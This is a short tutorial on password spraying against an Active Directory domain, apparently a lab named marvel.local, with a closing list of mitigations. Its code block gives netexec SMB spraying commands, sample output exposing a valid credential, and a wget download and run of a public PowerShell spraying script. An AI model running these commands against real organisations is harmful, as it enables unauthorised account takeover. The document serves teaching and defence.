# Password Spray

Password spraying is an attack technique where an attacker attempts to access many user accounts using a few commonly used passwords, rather than brute-forcing one account with many guesses. This helps avoid account lockouts and reduces the chance of detection, making it effective against organizations with weak password policies

## Reason of performing Password Spray attack

- Many organizations permit password complexity and rotation policies that still leave some accounts with weak or reused passwords
- Account lockout settings are often set to prevent denial-of-service (e.g., high thresholds), so attackers can try attempts without triggering immediate lockouts
- Legacy authentication protocols and poorly segmented auth paths increase the attack surface

```
# After finding the usernames in the enumeration use it for password spray
nxc smb marvel.local -u user.txt -p user.txt --continue-on-success

# save the output in a textfile
nxc smb marvel.local -u user.txt -p user.txt --continue-on-success | tee -a brute_user_as_pass.txt

# get the valid credentials found
cat brute_user_as_pass.txt | grep -ia +
SMB                      marvel.local     445    DC               [+] marvel.local\lucy.heartfilia:lucy.heartfilia

# Also try against the common password
nxc smb marvel.local -u user.txt -p 'Summer2025!' --continue-on-success

# Getting the password policies by using the found valid credentials
nxc smb marvel.local -u alice.wonderland -p 'P@ssw0rd!' --pass-pol

# Other domain password spray scripts 
wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/refs/heads/master/DomainPasswordSpray.ps1

# Transfer the DomainPasswordSpray.ps1 and run it in the windows AD environment
.\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Summer2025!  -UserList .\user.txt -Force
Invoke-DomainPasswordSpray -UsernameAsPassword -UserList .\user.txt
```

## Mitigations

- Multi-Factor Authentication (MFA) - strongest single control. Require MFA for all privileged and interactive accounts; extend where feasible to all users
- Enforce strong, unique passwords for all users and service accounts; use password managers and rotation
- Smart lockout / throttling instead of aggressive all-or-nothing lockouts - e.g., Azure AD Smart Lockout and risk-based throttling
- Conditional Access - restrict sign-in by geography, device compliance, or trusted networks for sensitive accounts